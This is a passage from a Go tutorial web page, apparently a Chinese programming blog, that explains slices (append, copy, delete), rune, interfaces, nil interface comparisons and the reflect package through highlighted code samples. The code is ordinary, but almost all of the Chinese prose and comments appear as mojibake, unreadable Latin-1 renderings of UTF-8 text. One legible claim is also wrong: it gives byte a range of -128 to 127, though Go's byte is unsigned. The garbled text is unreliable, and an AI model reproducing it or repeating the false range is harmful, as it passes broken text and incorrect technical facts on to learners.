sæ²¡æœ‰å®¹é‡æ‰©å®¹äº†ï¼Œæ–°sliceå’ŒsæŒ‡å‘ä¸åŒæ•°ç»„ï¼ˆå¯ä»¥ç†è§£ä¸ºæ‰§è¡Œäº†sliceçš„æ·±æ‹·è´ï¼‰</span><br>s2 := <span class="hljs-built_in">append</span>(s1,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>)<br>fmt.Println(<span class="hljs-string">&quot;s2=&quot;</span>,s2, <span class="hljs-built_in">cap</span>(s2)) <span class="hljs-comment">//s2= [0 123 2 3 4 1 2 3 4 5] 16</span><br>s2[<span class="hljs-number">2</span>] = <span class="hljs-number">123</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 123 2] 8</span><br>fmt.Println(<span class="hljs-string">&quot;s2=&quot;</span>,s2, <span class="hljs-built_in">cap</span>(s2)) <span class="hljs-comment">//s2= [0 123 123 3 4 1 2 3 4 5] 16</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¤åˆ¶"><a href="#å¤åˆ¶" class="headerlink" title="å¤åˆ¶"></a>å¤åˆ¶</h3><p>copyæ–¹æ³•æ˜¯å¤åˆ¶äº†ä¸€ä»½ï¼Œå¼€è¾Ÿäº†æ–°çš„å†…å­˜ç©ºé—´ï¼Œä¸å†å¼•ç”¨s1çš„å†…å­˜åœ°å€</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//å®šä¹‰åˆ‡ç‰‡s1</span><br>s1 := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><br><span class="hljs-comment">//ç¬¬ä¸€ç§æ–¹å¼ï¼šç›´æ¥å£°æ˜å˜é‡ ç”¨=èµ‹å€¼</span><br><span class="hljs-comment">//s2åˆ‡ç‰‡å’Œs1å¼•ç”¨åŒä¸€ä¸ªå†…å­˜åœ°å€</span><br><span class="hljs-keyword">var</span> s2 = s1<br><br><span class="hljs-comment">//ç¬¬äºŒç§æ–¹å¼ï¼šcopy</span><br><span class="hljs-keyword">var</span> s3 = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">copy</span>(s3, s1)            <span class="hljs-comment">//ä½¿ç”¨copyå‡½æ•°å°† å‚æ•°2çš„å…ƒç´ å¤åˆ¶åˆ°å‚æ•°1</span><br><br>s1[<span class="hljs-number">0</span>] = <span class="hljs-number">11</span><br>fmt.Printf(<span class="hljs-string">&quot;s1:%v s2:%v s3:%v&quot;</span>,s1, s2, s3) <span class="hljs-comment">//s1å’Œs2æ˜¯[11 2 3] s3æ˜¯[1 2 3]</span><br></code></pre></td></tr></table></figure><h3 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h3><p>åˆ é™¤åˆ‡ç‰‡ä¸­çš„å…ƒç´  ä¸èƒ½ç›´æ¥åˆ é™¤ å¯ä»¥ç»„åˆä½¿ç”¨åˆ†å‰²+appendçš„æ–¹å¼åˆ é™¤åˆ‡ç‰‡ä¸­çš„å…ƒç´ </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">s3 := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>s3 = <span class="hljs-built_in">append</span>(s3[:<span class="hljs-number">1</span>], s3[<span class="hljs-number">2</span>:]...) <span class="hljs-comment">//ç¬¬ä¸€ä¸ªä¸ç”¨æ‹†å¼€ åŸå› æ˜¯ä¸€ä¸ªä½œä¸ºè¢«æ¥å—çš„ä¸€æ–¹  æ˜¯æŠŠåé¢çš„å…ƒç´ è¿½åŠ åˆ°ç¬¬ä¸€ä¸ª</span><br>fmt.Println(s3)<br></code></pre></td></tr></table></figure><h2 id="rune"><a href="#rune" class="headerlink" title="rune"></a>rune</h2><p>runeå®ƒæ˜¯int32çš„åˆ«åï¼ˆ-2147483648~2147483647ï¼‰ï¼Œç›¸æ¯”äºbyteï¼ˆ-128ï½127ï¼‰ï¼Œå¯è¡¨ç¤ºçš„å­—ç¬¦æ›´å¤šã€‚ç”±äºruneå¯è¡¨ç¤ºçš„èŒƒå›´æ›´å¤§ï¼Œæ‰€ä»¥èƒ½å¤„ç†ä¸€åˆ‡å­—ç¬¦ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬ä¸­æ–‡å­—ç¬¦ã€‚åœ¨å¹³æ—¶è®¡ç®—ä¸­æ–‡å­—ç¬¦ï¼Œå¯ç”¨runeã€‚</p><p>å­—ç¬¦ä¸²ä¿®æ”¹æ˜¯ä¸èƒ½ç›´æ¥ä¿®æ”¹çš„ï¼Œéœ€è¦è½¬æˆruneåˆ‡ç‰‡åå†ä¿®æ”¹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := <span class="hljs-string">&quot;å°ç™½å…”&quot;</span><br>s3 := []<span class="hljs-keyword">rune</span>(s2)        <span class="hljs-comment">//æŠŠå­—ç¬¦ä¸²å¼ºåˆ¶è½¬æˆruneåˆ‡ç‰‡</span><br>s3[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;å¤§&#x27;</span>             <span class="hljs-comment">//æ³¨æ„ è¿™é‡Œéœ€è¦ä½¿ç”¨å•å¼•å·çš„å­—ç¬¦ï¼Œè€Œä¸æ˜¯åŒå¼•å·çš„å­—ç¬¦ä¸²</span><br>fmt.Println(<span class="hljs-keyword">string</span>(s3)) <span class="hljs-comment">//æŠŠruneç±»å‹çš„s3å¼ºè½¬æˆå­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p><strong>åªè¦æ˜¯åŒå¼•å·åŒ…è£¹çš„ç±»å‹å°±æ˜¯stringï¼Œåªè¦æ˜¯å•å¼•å·åŒ…è£¹çš„ç±»å‹å°±æ˜¯int32ï¼Œä¹Ÿå°±æ˜¯runeã€‚å’Œä¸­è‹±æ–‡æ— å…³ã€‚</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">c1 := <span class="hljs-string">&quot;çº¢&quot;</span><br>c2 := <span class="hljs-string">&#x27;çº¢&#x27;</span>                            <br>fmt.Printf(<span class="hljs-string">&quot;c1çš„ç±»å‹:%T c2çš„ç±»å‹:%T \\n&quot;</span>, c1, c2)  <span class="hljs-comment">//c1çš„ç±»å‹:string c2çš„ç±»å‹:int32</span><br>c3 := <span class="hljs-string">&quot;H&quot;</span>                            <br>c4 := <span class="hljs-string">&#x27;H&#x27;</span>                            <br>fmt.Printf(<span class="hljs-string">&quot;c3çš„ç±»å‹:%T c4çš„ç±»å‹:%T \\n&quot;</span>, c3, c4)  <span class="hljs-comment">//c3çš„ç±»å‹:string c4çš„ç±»å‹:int32</span><br></code></pre></td></tr></table></figure><h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><p>Interface æ˜¯ä¸€ä¸ªå®šä¹‰äº†æ–¹æ³•ç­¾åçš„é›†åˆ,ç”¨æ¥æŒ‡å®šå¯¹è±¡çš„è¡Œä¸ºï¼Œå¦‚æœå¯¹è±¡åšåˆ°äº† Interface ä¸­æ–¹æ³•é›†å®šä¹‰çš„è¡Œä¸ºï¼Œé‚£å°±å¯ä»¥è¯´å®ç°äº† Interfaceï¼›</p><p>è¿™äº›æ–¹æ³•å¯ä»¥åœ¨ä¸åŒçš„åœ°æ–¹è¢«ä¸åŒçš„å¯¹è±¡å®ç°ï¼Œè¿™äº›å®ç°å¯ä»¥å…·æœ‰ä¸åŒçš„è¡Œä¸ºï¼›</p><p>interface çš„ä¸»è¦å·¥ä½œä»…æ˜¯æä¾›æ–¹æ³•åç§°ç­¾å,è¾“å…¥å‚æ•°,è¿”å›ç±»å‹ã€‚æœ€ç»ˆç”±å…·ä½“çš„å¯¹è±¡æ¥å®ç°æ–¹æ³•ï¼Œæ¯”å¦‚ structï¼›</p><p>interface åˆå§‹åŒ–å€¼ä¸º nilï¼›</p><p><code>golang</code>æ¥å£å®šä¹‰ä¸èƒ½åŒ…å«å˜é‡ï¼Œä½†æ˜¯å…è®¸ä¸å¸¦ä»»ä½•æ–¹æ³•ï¼Œè¿™ç§ç±»å‹çš„æ¥å£å« <code>empty interface</code>ã€‚</p><p>ä½¿ç”¨ type å…³é”®å­—æ¥ç”³æ˜ï¼Œinterface ä»£è¡¨ç±»å‹ï¼Œå¤§æ‹¬å·é‡Œé¢å®šä¹‰æ¥å£çš„æ–¹æ³•ç­¾åé›†åˆã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Animal <span class="hljs-keyword">interface</span> &#123;<br>Bark() <span class="hljs-keyword">string</span><br>Walk() <span class="hljs-keyword">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹ï¼ŒDog å®ç°äº† Animal æ¥å£ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ Animal çš„å®ä¾‹å»æ¥æ”¶ Dogçš„å®ä¾‹ï¼Œå¿…é¡»æ˜¯åŒæ—¶å®ç° Bark() å’ŒWalk() æ–¹æ³•ï¼Œå¦åˆ™éƒ½ä¸èƒ½ç®—å®ç°äº†Animalæ¥å£ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Dog <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-keyword">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(dog Dog)</span> <span class="hljs-title">Bark</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;<br>fmt.Println(dog.name + <span class="hljs-string">&quot;:wan wan wan!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wan wan wan&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(dog Dog)</span> <span class="hljs-title">Walk</span><span class="hljs-params">()</span> <span class="hljs-title">string</span></span> &#123;<br>fmt.Println(dog.name + <span class="hljs-string">&quot;:walk to park!&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;walk to park&quot;</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> animal Animal<br><br>fmt.Println(<span class="hljs-string">&quot;animal value is:&quot;</span>, animal)<span class="hljs-comment">//animal value is: &lt;nil&gt;</span><br>fmt.Printf(<span class="hljs-string">&quot;animal type is: %T\\n&quot;</span>, animal) <span class="hljs-comment">//animal type is: &lt;nil&gt;</span><br><br>animal = Dog&#123;<span class="hljs-string">&quot;æ—ºè´¢&quot;</span>&#125;<br>animal.Bark() <span class="hljs-comment">//æ—ºè´¢:wan wan wan!</span><br>animal.Walk() <span class="hljs-comment">//æ—ºè´¢:walk to park!</span><br><br>fmt.Println(<span class="hljs-string">&quot;animal value is:&quot;</span>, animal) <span class="hljs-comment">//animal value is: &#123;æ—ºè´¢&#125;</span><br>fmt.Printf(<span class="hljs-string">&quot;animal type is: %T\\n&quot;</span>, animal) <span class="hljs-comment">//animal type is: main.Dog</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>nil interface</strong></p><p>å®˜æ–¹å®šä¹‰ï¼šInterface values with nil underlying values:</p><ul><li>åªå£°æ˜æ²¡èµ‹å€¼çš„interface æ˜¯nil interfaceï¼Œvalueå’Œ type éƒ½æ˜¯ nil</li><li>åªè¦èµ‹å€¼äº†ï¼Œå³ä½¿èµ‹äº†ä¸€ä¸ªå€¼ä¸ºnilç±»å‹ï¼Œä¹Ÿä¸å†æ˜¯nil interface</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> I <span class="hljs-keyword">interface</span> &#123;<br>Hello()<br>&#125;<br><br><span class="hljs-keyword">type</span> S []<span class="hljs-keyword">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(i S)</span> <span class="hljs-title">Hello</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> i I<br>fmt.Printf(<span class="hljs-string">&quot;1:i Type:%T\\n&quot;</span>, i)<br>fmt.Printf(<span class="hljs-string">&quot;2:i Value:%v\\n&quot;</span>, i)<br><br><span class="hljs-keyword">var</span> s S<br><span class="hljs-keyword">if</span> s == <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;3:s Value%v\\n&quot;</span>, s)<br>fmt.Printf(<span class="hljs-string">&quot;4:s Type is %T\\n&quot;</span>, s)<br>&#125;<br><br>i = s<br><span class="hljs-keyword">if</span> i == <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;5:i is nil&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;6:i Type:%T\\n&quot;</span>, i)<br>fmt.Printf(<span class="hljs-string">&quot;7:i Value:%v\\n&quot;</span>, i)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>outputï¼š</p><p>å…¶ä¸­æŠŠå€¼ä¸º nil çš„å˜é‡ s èµ‹å€¼iå,i ä¸å†ä¸ºnil interface</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span>:i Type:&lt;<span class="hljs-literal">nil</span>&gt;<br><span class="hljs-number">2</span>:i Value:&lt;<span class="hljs-literal">nil</span>&gt;<br><span class="hljs-number">3</span>:s Value[]<br><span class="hljs-number">4</span>:s Type is main.S<br><span class="hljs-number">6</span>:i Type:main.S<br><span class="hljs-number">7</span>:i Value:[]<br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> State <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil1</span><span class="hljs-params">(a, b <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil2</span><span class="hljs-params">(a *State, b <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil3</span><span class="hljs-params">(a <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil4</span><span class="hljs-params">(a *State)</span> <span class="hljs-title">bool</span></span> &#123;<br><span class="hljs-keyword">return</span> a == <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testnil5</span><span class="hljs-params">(a <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">bool</span></span> &#123;<br>v := reflect.ValueOf(a)<br><span class="hljs-keyword">return</span> !v.IsValid() || v.IsNil()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a *State<br>fmt.Println(testnil1(a, <span class="hljs-literal">nil</span>)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil2(a, <span class="hljs-literal">nil</span>)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil3(a)) <span class="hljs-comment">//false</span><br>fmt.Println(testnil4(a)) <span class="hljs-comment">//true</span><br>fmt.Println(testnil5(a)) <span class="hljs-comment">//true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><p>åå°„ä¸»è¦ä¸Golangçš„interfaceç±»å‹ç›¸å…³ï¼ˆå®ƒçš„typeæ˜¯concrete typeï¼‰ï¼Œåªæœ‰interfaceç±»å‹æ‰æœ‰åå°„ä¸€è¯´ã€‚</p><p>åœ¨Golangçš„å®ç°ä¸­ï¼Œæ¯ä¸ªinterfaceå˜é‡éƒ½æœ‰ä¸€ä¸ªå¯¹åº”pairï¼Œpairä¸­è®°å½•äº†å®é™…å˜é‡çš„å€¼å’Œç±»å‹:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">(value, <span class="hljs-keyword">type</span>)<br></code></pre></td></tr></table></figure><h3 id="åŸºæœ¬åŠŸèƒ½"><a href="#åŸºæœ¬åŠŸèƒ½" class="headerlink" title="åŸºæœ¬åŠŸèƒ½"></a>åŸºæœ¬åŠŸèƒ½</h3><p>reflect.TypeOfï¼š ç›´æ¥ç»™åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„typeç±»å‹ï¼Œå¦‚float64ã€intã€å„ç§pointerã€struct ç­‰ç­‰çœŸå®çš„ç±»å‹</p><p>reflect.ValueOfï¼šç›´æ¥ç»™åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„å…·ä½“çš„å€¼ï¼Œå¦‚1.2345è¿™ä¸ªå…·ä½“æ•°å€¼ï¼Œæˆ–è€…ç±»ä¼¼&amp;{1 â€œAllen.Wuâ€ 25} è¿™æ ·çš„ç»“æ„ä½“structçš„å€¼</p><p>ä¹Ÿå°±æ˜¯è¯´æ˜åå°„å¯ä»¥å°†â€œæ¥å£ç±»å‹å˜é‡â€è½¬æ¢ä¸ºâ€œåå°„ç±»å‹å¯¹è±¡â€ï¼Œåå°„ç±»å‹æŒ‡çš„æ˜¯reflect.Typeå’Œreflect.Valueè¿™ä¸¤ç§</p><h3 id="è·å–æ¥å£interfaceä¿¡æ¯"><a href="#è·å–æ¥å£interfaceä¿¡æ¯" class="headerlink" title="è·å–æ¥å£interfaceä¿¡æ¯"></a>è·å–æ¥å£interfaceä¿¡æ¯</h3><p>å½“æ‰§è¡Œreflect.ValueOf(interface)ä¹‹åï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªç±»å‹ä¸ºâ€relfect.Valueâ€å˜é‡ï¼Œå¯ä»¥é€šè¿‡å®ƒæœ¬èº«çš„Interface()æ–¹æ³•è·å¾—æ¥å£å˜é‡çš„çœŸå®å†…å®¹ï¼Œç„¶åå¯ä»¥é€šè¿‡ç±»å‹åˆ¤æ–­è¿›è¡Œè½¬æ¢ï¼Œè½¬æ¢ä¸ºåŸæœ‰çœŸå®ç±»å‹ã€‚</p><h4 id="å·²çŸ¥åŸæœ‰ç±»å‹"><a href="#å·²çŸ¥åŸæœ‰ç±»å‹" class="headerlink" title="å·²çŸ¥åŸæœ‰ç±»å‹"></a>å·²çŸ¥åŸæœ‰ç±»å‹</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> num <span class="hljs-keyword">float64</span> = <span class="hljs-number">1.2345</span><br><br>pointer := reflect.ValueOf(&amp;num)<br>value := reflect.ValueOf(num)<br><br><span class="hljs-comment">// å¯ä»¥ç†è§£ä¸ºâ€œå¼ºåˆ¶è½¬æ¢â€ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ—¶å€™ï¼Œè½¬æ¢çš„æ—¶å€™ï¼Œå¦‚æœè½¬æ¢çš„ç±»å‹ä¸å®Œå…¨ç¬¦åˆï¼Œåˆ™ç›´æ¥panic</span><br><span class="hljs-comment">// Golang å¯¹ç±»å‹è¦æ±‚éå¸¸ä¸¥æ ¼ï¼Œç±»å‹ä¸€å®šè¦å®Œå…¨ç¬¦åˆ</span><br><span class="hljs-comment">// å¦‚ä¸‹ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯*float64ï¼Œä¸€ä¸ªæ˜¯float64ï¼Œå¦‚æœå¼„æ··ï¼Œåˆ™ä¼španic</span><br>convertPointer := pointer.Interface().(*<span class="hljs-keyword">float64</span>)<br>convertValue := value.Interface().(<span class="hljs-keyword">float64</span>)<br><br>fmt.Println(convertPointer)<br>fmt.Println(convertValue)<br>&#125;<br><br><span class="hljs-comment">//è¿è¡Œç»“æœï¼š</span><br><span class="hljs-comment">//0xc42000e238</span><br><span class="hljs-comment">//1.2345</span><br><br></code></pre></td></tr></table></figure><h4 id="æœªçŸ¥åŸæœ‰ç±»å‹"><a href="#æœªçŸ¥åŸæœ‰ç±»å‹" class="headerlink" title="æœªçŸ¥åŸæœ‰ç±»å‹"></a>æœªçŸ¥åŸæœ‰ç±»å‹</h4><p>è¿›è¡Œéå†æ¢æµ‹å…¶Filed</p><p>é€šè¿‡è¿è¡Œç»“æœå¯ä»¥å¾—çŸ¥è·å–æœªçŸ¥ç±»å‹çš„interfaceçš„å…·ä½“å˜é‡åŠå…¶ç±»å‹çš„æ­¥éª¤ä¸ºï¼š</p><ol><li>å…ˆè·å–interfaceçš„reflect.Typeï¼Œç„¶åé€šè¿‡NumFieldè¿›è¡Œéå†</li><li>å†é€šè¿‡reflect.Typeçš„Fieldè·å–å…¶Field</li><li>æœ€åé€šè¿‡Fieldçš„Interface()å¾—åˆ°å¯¹åº”çš„value</li></ol><p>é€šè¿‡è¿è¡Œç»“æœå¯ä»¥å¾—çŸ¥è·å–æœªçŸ¥ç±»å‹çš„interfaceçš„æ‰€å±æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰çš„æ­¥éª¤ä¸ºï¼š</p><ol><li>å…ˆè·å–interfaceçš„reflect.Typeï¼Œç„¶åé€šè¿‡NumMethodè¿›è¡Œéå†</li><li>å†åˆ†åˆ«é€šè¿‡reflect.Typeçš„Methodè·å–å¯¹åº”çš„çœŸå®çš„æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰</li><li>æœ€åå¯¹ç»“æœå–å…¶Nameå’ŒTypeå¾—çŸ¥å…·ä½“çš„æ–¹æ³•å</li><li>ä¹Ÿå°±æ˜¯è¯´åå°„å¯ä»¥å°†â€œåå°„ç±»å‹å¯¹è±¡â€å†é‡æ–°è½¬æ¢ä¸ºâ€œæ¥å£ç±»å‹å˜é‡â€</li><li>struct æˆ–è€… struct çš„åµŒå¥—éƒ½æ˜¯ä¸€æ ·çš„åˆ¤æ–­å¤„ç†æ–¹å¼</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>Id   <span class="hljs-keyword">int</span><br>Name <span class="hljs-keyword">string</span><br>Age  <span class="hljs-keyword">int</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span> <span class="hljs-title">ReflectCallFunc</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Allen.Wu ReflectCallFunc&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>user := User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Allen.Wu&quot;</span>, <span class="hljs-number">25</span>&#125;<br><br>DoFiledAndMethod(user)<br><br>&#125;<br><br><span class="hljs-comment">// é€šè¿‡æ¥å£æ¥è·å–ä»»æ„å‚æ•°ï¼Œç„¶åä¸€ä¸€æ­æ™“</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DoFiledAndMethod</span><span class="hljs-params">(input <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> 